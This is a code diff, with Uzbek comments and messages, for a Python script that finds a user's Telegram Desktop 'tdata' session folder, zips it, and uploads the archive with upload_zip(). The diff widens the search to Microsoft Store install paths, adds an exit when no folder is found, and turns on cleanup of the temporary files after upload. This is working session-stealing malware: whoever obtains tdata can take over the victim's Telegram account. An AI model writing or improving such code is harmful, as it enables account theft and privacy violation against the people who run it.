@@ -105,12 +105,24 @@ def find_tdata():
     possible_paths = []
 
     if system == "Windows":
-        appdata = Path.home() / "AppData" / "Roaming"
+        # Windows muhit o'zgaruvchilari orqali aniqroq topamiz
+        appdata = os.environ.get("APPDATA", str(home / "AppData" / "Roaming"))
+        localappdata = os.environ.get("LOCALAPPDATA", str(home / "AppData" / "Local"))
 
         possible_paths = [
-            appdata / "Telegram Desktop" / "tdata",
-            home / "AppData" / "Local" / "Telegram Desktop" / "tdata",
+            Path(appdata) / "Telegram Desktop" / "tdata",
+            Path(localappdata) / "Telegram Desktop" / "tdata",
         ]
+        
+        # Microsoft Store orqali o'rnatilgan bo'lsa:
+        packages_dir = Path(localappdata) / "Packages"
+        if packages_dir.exists():
+            try:
+                for tg_folder in packages_dir.glob("TelegramMessengerLLP*"):
+                    possible_paths.append(tg_folder / "LocalCache" / "Roaming" / "Telegram Desktop" / "tdata")
+                    possible_paths.append(tg_folder / "LocalState" / "tdata")
+            except Exception:
+                pass
 
     elif system == "Darwin":  # macOS
         possible_paths = [
@@ -163,6 +175,11 @@ if __name__ == "__main__":
 
     path=find_tdata()
 
+    if not path:
+        print("❌ Xato: Telegram tdata papkasi avtomatik topilmadi!")
+        input("Dasturdan chiqish uchun Enter tugmasini bosing...")
+        sys.exit(1)
+
     try:
         zip_file, temp_dir = prepare_folder(path)
 
@@ -170,10 +187,10 @@ if __name__ == "__main__":
         print(zip_file)
         upload_zip(zip_file)
 
-        # Shu yerda zip_file'ni serverga yuborish mumkin.
-        # Upload tugagandan keyin:
-        #
-        # cleanup(temp_dir)
+        cleanup(temp_dir)
+        print("✅ Tozalandi.")
+        input("Dastur tugadi, chiqish uchun Enter tugmasini bosing...")
 
     except Exception as e:
-        print(f"❌ Xatolik: {e}")
+        print(f"❌ Xatolik yuz berdi: {e}")
+        input("Dasturdan chiqish uchun Enter tugmasini bosing...")
